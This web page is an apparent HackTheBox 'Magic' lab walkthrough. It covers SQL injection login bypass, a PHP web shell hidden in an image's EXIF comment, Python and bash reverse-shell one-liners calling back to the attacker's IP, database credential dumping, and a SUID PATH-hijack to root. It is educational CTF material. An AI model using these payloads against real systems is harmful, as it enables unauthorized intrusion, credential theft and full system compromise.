<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Magic | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="SQLi for login bypass and embed webshell to an image file"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.medium.com/hack-the-box-magic-10-10-10-185-scratch-f534fce85b66><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Magic"><meta property="og:description" content="SQLi for login bypass and embed webshell to an image file"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/magic/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2020-05-01T21:58:06+00:00"><meta property="article:modified_time" content="2021-04-09T13:32:05+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814.png"><meta name=twitter:title content="HackTheBox - Magic"><meta name=twitter:description content="SQLi for login bypass and embed webshell to an image file"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Magic","item":"https://fahmifj.github.io/hackthebox/magic/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Magic","name":"HackTheBox - Magic","description":"SQLi for login bypass and embed webshell to an image file","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Magic from Hack The Box features a PHP-based web application which is vulnerable to SQL injection for login bypass. Embedding a web shell payload to a valid image file and adding a .php extension to it can bypass the upload filter, and this allows me to have a code execution on the system. Enumerating the systems discovers database credentials, and the credentials are used to retrieve another credentials from the database which is reused by the user. For the root part, there’s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.\nSkills Learned SQL injection Bypassing Upload Filter SUID exploitation Tools Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Exiftool - https://exiftool.org/ Reconnaissance Nmap → root@iamf «magic» «10.10.14.169» $ nmap -sC -sV -oA scans/magic 10.10.10.185 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel nmap found two ports open, an HTTP service on port 80 and SSH service on port 22\nEnumeration TCP 80 - Website The home page shows a bunch of images.\nBy clicking “Views image”, I know some images located on /images/uploads and some others on /images/fulls. At the bottom page, there’s a login button that points to /login.php\nCommon credentials don’t seem to work here.\nFoothold Shell as www-data SQL injection - Login bypass on /login.php The login form doesn’t allows spacing between character, but it can be tricked by copy and paste.\nA basic sql injection technique ' or 1 = 1 -- - to bypass login is work against the login page.\nIn MySQL, a space after a comment is a must -- [space], because of that I added -- - to make it clear.\nWe can assume the back-end query would look like this:\n...\u003csome php\u003e... $username = $_POST['user'] $pwd = $_POST['password'] ...\u003csome php\u003e... SELECT username, password from table.user where username='$username' and password='$pwd' If I assign ' or 1 = 1 -- - as value of $username, it becomes:\nSELECT username, password from table.user where username='' or 1 = 1 -- -' and password='$pwd' Upload filter bypass Upon a successful login, the site redirects me to /upload.php. It shows up with an upload form. It only accepts a valid image file.\nAfter some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using exiftool.\n→ root@iamf «forest» «10.10.14.169» $ ./exiftool -Comment='\u003c?php echo \"\"; system($_GET[\"cmd\"]); ?\u003e' iamf.jpg Next, I added .php extension right before the image extension (in my case it is .jpg, so it becomes filename.php.jpg).\nBack to /upload.php, now it accepts my malicious image.\nI can find the uploaded file at http://htb.magic/images/uploads/.\nWhen I visit http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd, I can see the code execution is working\nShell access The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.\nI’ll enter this URL on the browser.\nhttp://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27\" When I check my listener:\n→ root@iamf «magic» «10.10.14.169» $ nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 19448 bash: cannot set terminal process group (1327): Inappropriate ioctl for device bash: no job control in this shell $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation Shell as theseus Enumeration There is a database configuration, db.php5, that stores database credentials.\n$ find . -type f -user www-data ...... ./var/www/Magic/db.php5 ...... Database dump I can use netstat to confirm that the MySQL server is currently running.\nwww-data@ubuntu:/var/www/Magic$ netstat -tlpn ...... Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name ...... tcp\t0\t0 127.0.0.1:3306 0.0.0.0:* LISTEN - ...... Unfortunately, the mysql binary is not present in this box.\nBut, I could use mysqldump to dump the database, and it contains another credentials: admin:Th3s3usW4sK1ng.\nwww-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p'iamkingtheseus' ...... LOCK TABLES `login` WRITE; /*!40000 ALTER TABLE `login` DISABLE KEYS */; INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng'); /*!40000 ALTER TABLE `login` ENABLE KEYS */; UNLOCK TABLES; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */; ...... Shell upgrade to SSH It turns out that the password Th3s3usW4sK1ng is reused by user theseus.\nwww-data@ubuntu:/var/www/Magic$ su theseus Password: theseus@ubuntu:/var/www/Magic$ Before enumeration, I would like to switch to SSH. First, I’ll generate a new SSH key.\n→ root@iamf «magic» «10.10.14.169» $ ssh-keygen -f theseus Then, I’ll add the newly generated public key to theseus’s authorized_keys.\ntheseus@ubuntu:~/.ssh$ echo 'ssh-rsa AAABBBCCCDDD' \u003e\u003e authorized_keys Now I can log in via SSH.\n→ root@iamf «magic» «10.10.14.169» $ ssh -i theseus@10.10.10.185 ...... theseus@ubuntu:~$ id uid=1000(theseus) gid=1000(theseus) groups=100(users),1000(theseus) Shell as root Enumeration Upon enumerating for SUID, there’s a binary that doesn’t seem to be a common SUID on Ubuntu called sysinfo.\ntheseus@ubuntu:~$ find / -perm -u=s -type f 2\u003e/dev/null The sysinfo binary is owned by root, but it can be executed by the users group and theseus is a member of that group.\ntheseus@ubuntu:~$ ls -las /bin | grep sysinfo 24 -rwsr-x--- 1 root users 22040 Oct 21 2019 sysinfo When I execute the binary and it returns some hardware information on the screen that looks similar to what lshw, free and other binary related to hardware info produces.\nA quick search on Google shows:\nSo it is the same header.\nRunning strings against sysinfo reveals it calls lshw, free, fdisk and some other bins without their absolute path. (I don’t have the screenshots to show what it looks like, also can’t find the logs on my notes, sorry)\nAbsolute path: /bin/sysinfo –\u003e fixed path, can not be modified except global write access is permitted. (cmiiw) Relative path: sysinfo –\u003e resolved by user’s environment, the path follows user’s $PWD. Path Hijack on SUID Knowing the SUID binary uses relative path to call other binaries, I can abuse this by creating, for example, a fake lshw binary that contains a reverse shell.\nFirst thing to do is, I will create a fake lshw in /tmp/iamf folder and append one liner bash reverse shell.\ntheseus@ubuntu:/tmp$ mkdir iamf theseus@ubuntu:/tmp$ which lshw /bin/lshw Next, I’ll export /tmp/iamf to the environment variable $PATH.\ntheseus@ubuntu:/tmp$ echo -e '#!/bin/sh bash -i \u003e\u0026 /dev/tcp/10.10.10.169/1234 0\u003e\u00261' \u003e iamf/lshw theseus@ubuntu:/tmp$ export PATH=/tmp/iamf:$PATH Now If I call lshw, the OS will resolve it to the one on /tmp/iamf.\ntheseus@ubuntu:/tmp$ which lshw /tmp/iamf/lshw After that, I can just execute the sysinfo binary. However, it then just hangs.\ntheseus@ubuntu:/tmp$ sysinfo ====================Hardware Info==================== That is because its execution is interrupted by the reverse shell. I’m rooted now.\n→ root@iamf «magic» «10.10.14.169» $ nc -nvlp 1234 listening on [any] 1234 ... connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 36094 root@ubuntu:/tmp/iamf# id uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus) ","wordCount":"1147","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814.png","datePublished":"2020-05-01T21:58:06.465Z","dateModified":"2021-04-09T13:32:05+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/magic/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Magic</h1><p class=post-description>SQLi for login bypass and embed webshell to an image file</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>May 01, 2020
<span class=date-update>(Imported: April 09, 2021)</span></span>&nbsp;&#183;&nbsp;<span class=meta-read>6 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80  -  Website">TCP 80  -  Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-theseus aria-label="Shell as theseus">Shell as theseus</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814_hua6ac2eaec3421133df768481fb7a714b_137571_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814_hua6ac2eaec3421133df768481fb7a714b_137571_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814_hua6ac2eaec3421133df768481fb7a714b_137571_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814.png 740w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/magic/imgs/image-20210411043643814.png alt="HackTheBox - Magic" width=740 height=466><p>HackTheBox - Magic</p></figure><p>Magic from Hack The Box features a PHP-based web application which is vulnerable to SQL injection for login bypass. Embedding a web shell payload to a valid image file and adding a <code>.php</code> extension to it can bypass the upload filter, and this allows me to have a code execution on the system. Enumerating the systems discovers database credentials, and the credentials are used to retrieve another credentials from the database which is reused by the user. For the root part, there&rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>SQL injection</li><li>Bypassing Upload Filter</li><li>SUID exploitation</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>Exiftool - <a href=https://exiftool.org/>https://exiftool.org/</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «magic» «10.10.14.169»
</span></span><span class=line><span class=cl>$ nmap -sC -sV -oA scans/magic 10.10.10.185
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Magic Portfolio
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p><code>nmap</code> found two ports open, an HTTP service on port 80 and SSH service on port 22</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80  -  Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>The home page shows a bunch of images.</p><img src=imgs/image-20210413132328926.png alt=image-20210413132328926 style=zoom:80%><p>By clicking &ldquo;Views image&rdquo;, I know some images located on <code>/images/uploads</code> and some others on <code>/images/fulls</code>. At the bottom page, there&rsquo;s a login button that points to <code>/login.php</code></p><img src=imgs/image-20210412052815532.png alt=image-20210412052815532 style=zoom:80%><p>Common credentials don&rsquo;t seem to work here.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=sql-injection---login-bypass-on-loginphp>SQL injection - Login bypass on <code>/login.php</code><a class=anchor aria-hidden=true href=#sql-injection---login-bypass-on-loginphp>#</a></h4><blockquote><p>The login form doesn&rsquo;t allows spacing between character, but it can be tricked by copy and paste.</p></blockquote><p>A basic sql injection technique <code>' or 1 = 1 -- -</code> to bypass login is work against the login page.</p><blockquote><p>In MySQL, a space after a comment is a must <code>-- [space]</code>, because of that I added <code>-- -</code> to make it clear.</p></blockquote><p>We can assume the back-end query would look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=p>...</span><span class=o>&lt;</span><span class=k>some</span><span class=w> </span><span class=n>php</span><span class=o>&gt;</span><span class=p>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>$</span><span class=n>username</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=err>$</span><span class=n>_POST</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=err>$</span><span class=n>pwd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=err>$</span><span class=n>_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>...</span><span class=o>&lt;</span><span class=k>some</span><span class=w> </span><span class=n>php</span><span class=o>&gt;</span><span class=p>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>table</span><span class=p>.</span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;$username&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;$pwd&#39;</span><span class=w>
</span></span></span></code></pre></div><p>If I assign <code>' or 1 = 1 -- -</code> as value of <code>$username</code>, it becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>table</span><span class=p>.</span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=c1>-- -&#39; and password=&#39;$pwd&#39;
</span></span></span></code></pre></div><h4 id=upload-filter-bypass>Upload filter bypass<a class=anchor aria-hidden=true href=#upload-filter-bypass>#</a></h4><p>Upon a successful login, the site redirects me to <code>/upload.php</code>. It shows up with an upload form. It only accepts a valid image file.</p><img src=imgs/image-20210413153556151.png alt=image-20210413153556151 style=zoom:80%><p>After some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using <code>exiftool</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «forest» «10.10.14.169»
</span></span><span class=line><span class=cl>$ ./exiftool -Comment<span class=o>=</span><span class=s1>&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
</span></span></code></pre></div><p>Next, I added <code>.php</code> extension right before the image extension (in my case it is <code>.jpg</code>, so it becomes <code>filename.php.jpg</code>).</p><p>Back to <code>/upload.php</code>, now it accepts my malicious image.</p><img src=imgs/image-20210413153504323.png alt=image-20210413153504323 style=zoom:80%><p>I can find the uploaded file at <code>http://htb.magic/images/uploads/</code>.</p><p>When I visit <code>http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd</code>, I can see the code execution is working</p><img src=https://cdn-images-1.medium.com/max/1000/1*WJEvgyrM5UmXULt8uBhu3A.png alt=img style=zoom:80%><h4 id=shell-access>Shell access<a class=anchor aria-hidden=true href=#shell-access>#</a></h4><p>The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.</p><p>I&rsquo;ll enter this URL on the browser.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>http://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&#34;
</span></span></span></code></pre></div><p>When I check my listener:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «magic» «10.10.14.169»
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>443</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.169<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.185<span class=o>]</span> <span class=m>19448</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1327<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-theseus>Shell as theseus<a class=anchor aria-hidden=true href=#shell-as-theseus>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>There is a database configuration, <code>db.php5</code>, that stores database credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find . -type f -user www-data
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>./var/www/Magic/db.php5
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><img src=imgs/image-20210413153535228.png alt=image-20210413153535228 style=zoom:80%><h4 id=database-dump>Database dump<a class=anchor aria-hidden=true href=#database-dump>#</a></h4><p>I can use <code>netstat</code> to confirm that the MySQL server is currently running.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/var/www/Magic$ netstat -tlpn
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>tcp		0		<span class=m>0</span>   127.0.0.1:3306           0.0.0.0:*              LISTEN       -
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Unfortunately, the <code>mysql</code> binary is not present in this box.</p><img src=imgs/image-20210413153425371.png alt=image-20210413153425371><p>But, I could use <code>mysqldump</code> to dump the database, and it contains another credentials: <code>admin:Th3s3usW4sK1ng</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p<span class=s1>&#39;iamkingtheseus&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>LOCK TABLES <span class=sb>`</span>login<span class=sb>`</span> WRITE<span class=p>;</span>
</span></span><span class=line><span class=cl>/*!40000 ALTER TABLE <span class=sb>`</span>login<span class=sb>`</span> DISABLE KEYS */<span class=p>;</span>
</span></span><span class=line><span class=cl>INSERT INTO <span class=sb>`</span>login<span class=sb>`</span> VALUES <span class=o>(</span>1,<span class=s1>&#39;admin&#39;</span>,<span class=s1>&#39;Th3s3usW4sK1ng&#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>/*!40000 ALTER TABLE <span class=sb>`</span>login<span class=sb>`</span> ENABLE KEYS */<span class=p>;</span>
</span></span><span class=line><span class=cl>UNLOCK TABLES<span class=p>;</span>                                           
</span></span><span class=line><span class=cl>/*!40103 SET <span class=nv>TIME_ZONE</span><span class=o>=</span>@OLD_TIME_ZONE */<span class=p>;</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id=shell-upgrade-to-ssh>Shell upgrade to SSH<a class=anchor aria-hidden=true href=#shell-upgrade-to-ssh>#</a></h4><p>It turns out that the password <code>Th3s3usW4sK1ng</code> is reused by user <strong>theseus</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>www-data@ubuntu:/var/www/Magic$ su theseus
</span></span><span class=line><span class=cl>Password: 
</span></span><span class=line><span class=cl>theseus@ubuntu:/var/www/Magic$
